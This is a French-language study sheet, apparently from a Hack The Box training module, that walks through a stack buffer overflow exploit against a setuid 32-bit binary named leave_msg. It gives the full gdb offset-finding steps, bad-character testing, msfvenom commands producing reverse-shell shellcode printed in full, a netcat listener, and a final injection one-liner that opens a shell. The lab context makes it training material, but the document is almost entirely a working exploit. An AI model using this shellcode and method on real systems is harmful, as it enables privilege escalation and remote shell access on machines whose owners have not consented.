### 30/06/2022
### Fiche sur le module "Stack-Based Buffer Overflows on Linux x86" (HTB) (Skills Assessment)



file leave_msg
# ELF 32-bit avec un setuid



gdb leave_msg
(gdb) run $(python -c "print '\x55' * 2100")
# Le 2100 a été obtenu en tâtonnant



/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100 > pattern.txt
# Mettre la valeur du '-l' un peu au-dessus de la valeur obtenue si jamais on a trouvé la valeur exacte à laquelle le programme commence à balancer des erreurs de segmentation
# Penser à remettre le pattern en forme sur une ligne propre si ce n'est pas le cas
# Cette étape est nécessaire pour utiliser "pattern_offset.rb" un peu après



(gdb) run $(python -c "print '[pattern.txt]'")
# On obtient une autre erreur de segmentation avec un message censé donner l'adresse du registre EIP
# "Program received signal SIGSEGV, Segmentation fault. 0x37714336 in ?? ()"



(gdb) info registers
# Vérifier que le '0x37714336' obtenu correspond bien à l'adresse du registre EIP



/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336
# Cet outil sert à calculer combien d'octets il faut envoyer pour arriver à modifier le registre EIP
# '0x37714336' est l'adresse du registre EIP après l'injection du pattern
# Résultat : "Exact match at offset 2060"
# Le résultat est donc de (2060 + 4 octets) puisque le registre EIP fait 4 octets



(gdb) run $(python -c "print '\x55' * 2060 + '\x66' * 4")
(gdb) info registers
# Vérifier que le registre EIP a bien été écrasé et contient la valeur '0x66666666'
# Penser à utiliser "info proc all" pour vérifier plus en détail si besoin


msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
# Cette commande génère un shellcode pour notre cas
# Cela permettra de déterminer à peu près l'espace nécessaire pour le futur shellcode final

# Résultat :
# ===========================================================
# No encoder specified, outputting raw payload
# Payload size: 68 bytes
# Final size of c file: 311 bytes
# unsigned char buf[] =
# "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
# "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
# "\x02\x00\x7a\x69\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
# "\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
# "\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
# =============================================================

# On utilise la technique du NOP Slide
# Les chiffres 100 et 150 ont été choisis arbitrairement et ne sont pas la seule possibilité

# Buffer = "\x55" * (2060 - 100 - 150 - 4)
# NOP = "\x90" * 100
# Shellcode = "\xxx" * 150
# EIP = "\x66" * 4



(gdb) run $(python -c 'print "\x55" * (2064 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
(gdb) info registers
# Re-vérifier que EIP a bien pris la valeur 0x66666666


CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# Shellcode tout simple contenant tous les caractères de \x00 à \xff
# C'est absolument nécessaire pour l'étape de vérification des mauvais caractères
# On va l'injecter et vérifier quels caractères le système considère comme nuls en vérifiant l'état de la mémoire au moment de l'injection
# Tous les caractères qui ne seront pas là seront à considérer comme à exclure
# Exemple : "\x01\x02\x03\x00\x05" => '\x04' est un mauvais caractère

echo $CHARS | sed 's/\\x/ /g' | wc
# On obtient 256

(gdb) disass main
# Chercher la bonne fonction pour mettre un breakpoint dessus
# Dans notre cas ce sera 'leavemsg'

(gdb) break leavemsg

(gdb) run $(python -c "print '\x55' * (2064 - 256 - 4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"  + '\x66' * 4")

# Bien penser à retirer le 256 qui correspond à la taille de ce nouveau shellcode



(gdb) x/2000xb $esp+500
# Instruction permettant de regarder dans la mémoire et de vérifier quels caractères sont absents après la série de '\x55'
# Dans notre cas il manque \x00, \x09, \x0a et \x20
# Retirer ces caractères de $CHARS et relancer la ligne précédente avec le nouveau shellcode et 252 au lieu de 256 puisqu'on a retiré 4 caractères
# Si il y a un doute on peut recompter proprement avec "echo $CHARS | sed 's/\\x/ /g' | wc"
# Bien relancer le "(gdb) x/2000xb $esp+500" aussi pour vérifier qu'il n'y a plus aucun null byte



msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c --bad-chars "\x00\x09\x0a\x20" --out Shellcode_final.txt
# On re-fabrique un shellcode en précisant cette fois les caractères à exclure
# => 95 bytes


Buffer = "\x55" * (2060 - 100 - 95 - 4) = "\x55" * 1865
NOP = "\x90" * 100
Shellcode = \xxx *  95
EIP = "\x66" * 4

(gdb) run $(python -c 'print "\x55" * 1865 + [SHELLCODE] + "\x66" * 4')



x/2000xb $esp+1400
# Regarder l'adresse des instructions NOP
# Il faut faire pointer le registre EIP sur la plage des NOP pour qu'il exécute le shellcode
# Attention, l'adresse doit être à l'envers
# Exemple : '0xffffd6dc' donnera "\xdc\xd6\xff\xff"
# L'adresse ne doit pas contenir les mauvais caractères déterminés plus tôt



nc -nlvp 31337
# Sur un autre terminal
# Préparation du listener netcat qui va recevoir la connexion du reverse shell



./leave_msg $(python -c "print '\x55' * 1865 + '\x90' * 100 + '\xbf\xae\x9f\x62\x9f\xd9\xf6\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x83\xc5\x04\x31\x7d\x0e\x03\xd3\x91\x80\x6a\x1a\x75\xb3\x76\x0f\xca\x6f\x13\xad\x45\x6e\x53\xd7\x98\xf1\x07\x4e\x93\xcd\xea\xf0\x9a\x48\x0c\x98\x63\xab\xee\x59\xf4\xa9\xee\x23\x6d\x27\x0f\x63\x0b\x67\x81\xd0\x67\x84\xa8\x37\x4a\x0b\xf8\xdf\x3b\x23\x8e\x77\xac\x14\x5f\xe5\x45\xe2\x7c\xbb\xc6\x7d\x63\x8b\xe2\xb0\xe4' + '\xdc\xd6\xff\xff' ")

# Injection finale
# (1865 * '\x55') + (100 * NOP) + (Shellcode) + (Adresse des NOP donnée à EIP)
# Plus qu'à vérifier que la connexion se fasse bien sur l'autre terminal et à récupérer le flag
